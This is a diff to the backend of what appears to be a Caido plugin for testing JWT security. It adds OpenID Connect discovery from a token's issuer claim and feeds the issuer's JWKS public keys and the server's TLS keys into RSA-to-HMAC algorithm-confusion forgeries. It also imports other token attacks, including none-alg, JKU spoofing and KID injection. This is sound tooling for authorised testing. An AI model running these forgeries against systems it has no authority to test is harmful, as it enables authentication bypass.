@@ -5,15 +5,16 @@ import { SDK, DefineAPI, DefineEvents } from "caido:plugin";
 import { RequestSpec } from "caido:utils";
 
 import { parseJWT, getAlgorithmFamily, verifyRS256WithJWK } from "./crypto/jwt.js";
-import { generateRSAKeyPair, buildJWKSDocument, bigintToPublicKeyPem, x509CertToPublicKeyPem, type RSAKeyPair } from "./crypto/rsa.js";
+import { generateRSAKeyPair, buildJWKSDocument, bigintToPublicKeyPem, x509CertToPublicKeyPem, jwksToPublicKeys, type RSAKeyPair } from "./crypto/rsa.js";
 import { fetchTlsPublicKey, type TlsPublicKey } from "./crypto/tlsConnect.js";
 import { publicKeyPemToModulusHex } from "./crypto/tlsCert.js";
+import { discoverFromIssuer, type OIDCDiscovery } from "./crypto/certFetch.js";
 // NOTE: RSA key recovery (gmp-wasm) runs in the FRONTEND — the backend runtime
 // has no WebAssembly. The backend only collects candidate JWTs and launches the
 // confusion attack with the frontend-recovered key (see runRecoveredConfusion).
 import { buildNoneAttacks } from "./attacks/none.js";
 import { buildNullSigAttacks } from "./attacks/nullSig.js";
-import { buildAlgConfusionAttacks, buildAlgConfusionForKeys } from "./attacks/algConfusion.js";
+import { buildAlgConfusionAttacks, buildAlgConfusionForKeys, hmacConfusionTargets, type HmacAlg } from "./attacks/algConfusion.js";
 import { buildEmbeddedJWKAttacks } from "./attacks/embeddedJwk.js";
 import { buildJKUSpoofAttacks, SPOOF_KID } from "./attacks/jkuSpoof.js";
 import { buildKIDInjectionAttacks } from "./attacks/kidInject.js";
@@ -60,6 +61,19 @@ export type BackendEvents = DefineEvents<{
     selfVerified: boolean;
   }) => void;
   "jwks-found": (data: { sessionId: string; url: string; source: string; keyCount: number; content: string; pems: string[] }) => void;
+  // Structured summary of the token's `iss` claim + OpenID Connect discovery, for
+  // the "Key discovery / recovery" panel (left banner + right-pane detail).
+  "jwt-iss-discovery": (data: {
+    sessionId: string;
+    issPresent: boolean;
+    iss: string | null;
+    configRetrieved: boolean;   // openid-configuration was fetched from the iss URL
+    configUrl: string | null;
+    jwksUri: string | null;
+    keyExtracted: boolean;      // ≥1 key extracted from the issuer's JWKS
+    keyCount: number;
+    signingAlgs: string[];      // id_token_signing_alg_values_supported
+  }) => void;
   // Hand same-host JWT candidates to the FRONTEND for gmp-wasm key recovery
   // (the backend runtime has no WebAssembly).
   "jwt-recovery-candidates": (data: {
@@ -271,11 +285,95 @@ async function attackJwt(
           message: `Algorithm confusion skipped: token alg is ${parsed.header.alg} (only RS/PS/ES tokens can be downgraded to HMAC).`,
         });
       } else {
+        const originalAlg = parsed.header.alg as string;
+        let foundCount = 0;
+
+        // ── OpenID Connect discovery via the token's `iss` claim ─────────────
+        // Resolve iss → {iss}/.well-known/openid-configuration → jwks_uri, and read
+        // id_token_signing_alg_values_supported to know which confusion algs matter.
+        let issDiscovery: OIDCDiscovery | null = null;
+        const issRaw = parsed.payload.iss;
+        const iss = typeof issRaw === "string" ? issRaw : null;
+        if (iss) {
+          sdk.api.send("jwt-key-recovery-progress", {
+            sessionId,
+            message: `Algorithm confusion: resolving iss="${iss}" via OpenID Connect discovery…`,
+          });
+          try { issDiscovery = await discoverFromIssuer(httpGet, iss); } catch { issDiscovery = null; }
+          if (!issDiscovery) {
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: `Algorithm confusion: no OpenID configuration reachable for iss="${iss}".`,
+            });
+          } else {
+            const algs = issDiscovery.signingAlgs;
+            const hmacSupported = algs.filter((a) => /^HS(256|384|512)$/i.test(a));
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: `Algorithm confusion: OpenID config at ${issDiscovery.configUrl} — jwks_uri=${issDiscovery.jwksUri ?? "(none)"}, ` +
+                `id_token_signing_alg_values_supported=[${algs.join(", ") || "not advertised"}].`,
+            });
+            if (algs.length) {
+              sdk.api.send("jwt-key-recovery-progress", {
+                sessionId,
+                message: hmacSupported.length
+                  ? `Algorithm confusion: the issuer advertises HMAC alg(s) [${hmacSupported.join(", ")}] — confusion is RELEVANT; forging those.`
+                  : "Algorithm confusion: the issuer advertises only asymmetric alg(s) — HMAC not advertised, so confusion is less likely, but still attempted with the default HS mapping.",
+              });
+              if (!algs.some((a) => a.toUpperCase() === originalAlg.toUpperCase())) {
+                sdk.api.send("jwt-key-recovery-progress", {
+                  sessionId,
+                  message: `Algorithm confusion: note — the token's alg ${originalAlg} is not in the issuer's supported list.`,
+                });
+              }
+            }
+            // Surface the openid-configuration endpoint (raw doc carries the supported algs).
+            foundCount++;
+            sdk.api.send("jwks-found", {
+              sessionId,
+              url: issDiscovery.configUrl,
+              source: "OIDC configuration (iss)",
+              keyCount: issDiscovery.jwks?.keys.length ?? 0,
+              content: issDiscovery.configContent.slice(0, 16384),
+              pems: [],
+            });
+            // Surface the jwks_uri keys recovered from the issuer.
+            if (issDiscovery.jwks) {
+              const issPems = jwksToPublicKeys({ keys: issDiscovery.jwks.keys });
+              foundCount++;
+              sdk.api.send("jwks-found", {
+                sessionId,
+                url: issDiscovery.jwks.url,
+                source: "JWKS endpoint (iss)",
+                keyCount: issPems.length,
+                content: issDiscovery.jwks.content.slice(0, 16384),
+                pems: issPems,
+              });
+            }
+          }
+        }
+
+        // Structured iss-discovery summary for the "Key discovery / recovery" panel.
+        sdk.api.send("jwt-iss-discovery", {
+          sessionId,
+          issPresent: iss !== null,
+          iss,
+          configRetrieved: issDiscovery !== null,
+          configUrl: issDiscovery?.configUrl ?? null,
+          jwksUri: issDiscovery?.jwksUri ?? null,
+          keyExtracted: !!(issDiscovery?.jwks && issDiscovery.jwks.keys.length > 0),
+          keyCount: issDiscovery?.jwks?.keys.length ?? 0,
+          signingAlgs: issDiscovery?.signingAlgs ?? [],
+        });
+
+        // Which HMAC alg(s) the confusion attack should forge — issuer-driven when
+        // the OpenID metadata advertised them, else the classic same-strength mapping.
+        const targets: HmacAlg[] = hmacConfusionTargets(originalAlg, issDiscovery?.signingAlgs ?? []);
+
         sdk.api.send("jwt-key-recovery-progress", {
           sessionId,
           message: `Algorithm confusion: probing ${request.getHost()} for exposed JWKS & certificate key endpoints…`,
         });
-        let foundCount = 0;
         await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
           parsed,
           request.getHost(),
@@ -285,8 +383,18 @@ async function attackJwt(
           [], // first wave: no recovered keys yet — recovery runs as a second wave below
           // Surface every discovered key source so the analyst doesn't miss it.
           (found) => { foundCount++; sdk.api.send("jwks-found", { sessionId, ...found }); },
-          httpGet
+          httpGet,
+          targets
         ));
+
+        // Use the keys recovered from the issuer's JWKS to perform key-confusion attacks.
+        if (issDiscovery?.jwks) {
+          const issPems = jwksToPublicKeys({ keys: issDiscovery.jwks.keys });
+          if (issPems.length) {
+            attacks.push(...buildAlgConfusionForKeys(parsed, issPems, `issuer JWKS (${issDiscovery.jwks.url})`, targets));
+          }
+        }
+
         sdk.api.send("jwt-key-recovery-progress", {
           sessionId,
           message: foundCount > 0
@@ -313,7 +421,7 @@ async function attackJwt(
               sessionId,
               message: `Algorithm confusion: got the TLS public key${tlsKey.nHex ? ` (RSA, ${tlsKey.nHex.length * 4}-bit)` : " (non-RSA)"} — trying it as the HMAC secret.`,
             });
-            const tlsAttacks = buildAlgConfusionForKeys(parsed, [tlsKey.publicKeyPem], "webserver TLS certificate");
+            const tlsAttacks = buildAlgConfusionForKeys(parsed, [tlsKey.publicKeyPem], "webserver TLS certificate", targets);
             attacks.push(...tlsAttacks);
           } else {
             sdk.api.send("jwt-key-recovery-progress", {
@@ -335,7 +443,7 @@ async function attackJwt(
               sessionId,
               message: `Algorithm confusion: using the configured Certificate as the web server's TLS key${tlsKey.nHex ? ` (RSA, ${tlsKey.nHex.length * 4}-bit)` : ""}.`,
             });
-            attacks.push(...buildAlgConfusionForKeys(parsed, [pem], "configured TLS certificate"));
+            attacks.push(...buildAlgConfusionForKeys(parsed, [pem], "configured TLS certificate", targets));
           } catch (e) {
             sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Could not parse the configured Certificate: ${(e as Error).message}` });
           }
